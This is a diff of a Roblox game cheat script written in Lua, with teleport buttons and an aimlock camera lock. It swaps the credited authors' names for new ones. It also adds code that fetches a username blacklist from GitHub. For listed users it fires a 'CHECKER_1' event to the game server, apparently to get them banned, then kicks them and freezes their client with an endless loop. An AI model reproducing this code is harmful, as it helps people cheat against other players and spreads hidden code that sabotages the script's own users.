@@ -2260,7 +2260,7 @@ folder2:AddButton("School Roof", function(bool)
     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-525.353455, 68.125, 311.824402, 0.999992013, 1.03866675e-08, -0.00399552286, -1.03507425e-08, 1, 9.01170427e-09, 0.00399552286, -8.97027519e-09, 0.999992013)
 end)
 
-CreditTAB:AddButton("Brought To U By Mozie#0020 & Master Booga#7394", function(bool)
+CreditTAB:AddButton("Brought To U By Ratio#0069 & shmall#7394", function(bool)
     setclipboard("discord.gg/cpRfPKAMAh")
     wait(1)
     local function callback(text)
@@ -2283,8 +2283,8 @@ CreditTAB:AddButton("Brought To U By Mozie#0020 & Master Booga#7394", function(b
     })
 end)
 
-CreditTAB:AddButton("Mozie#0020", function(bool)
-    setclipboard("Mozie#0020")
+CreditTAB:AddButton("Ratio#0069", function(bool)
+    setclipboard("Raio#0069")
     wait(1)
     local function callback(text)
         if text == "Yes" then
@@ -2302,7 +2302,7 @@ CreditTAB:AddButton("Mozie#0020", function(bool)
         Icon = "RBXID OR BLANK";
         Duration = "DURATION IN SECONDS";
         callbakc = bindableFunction;
-        Button1 = "Add Mozie Now!, Thanks :)";
+        Button1 = "Add Ratio Now!, Thanks :)";
     })
 end)
 
@@ -2788,6 +2788,11 @@ RunService:BindToRenderStep("AimLock", 0, function()
         CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
     end
 end)
-if game.Players.LocalPlayer.Name == "bigcoolericman" or game.Players.LocalPlayer.Name == "DONALDFARTYFACE2008" or game.Players.LocalPlayer.Name == "superkillerbrendo" then
-    game.Players.LocalPlayer:Kick ("RIPBOZO")
-    end
+        if string.find(game:HttpGet("https://raw.githubusercontent.com/MozieCheats/SKID.YOU/main/Main/Blacklist"), game:GetService("Players").LocalPlayer.Name) then
+        game:findFirstChild("ReplicatedStorage"):findFirstChild("MainEvent"):FireServer("CHECKER_1")
+        wait(5)
+        game:GetService("Players").LocalPlayer:Kick("FUCKED BY Ratio#0069")
+        wait()
+        while true do
+        end
+      end
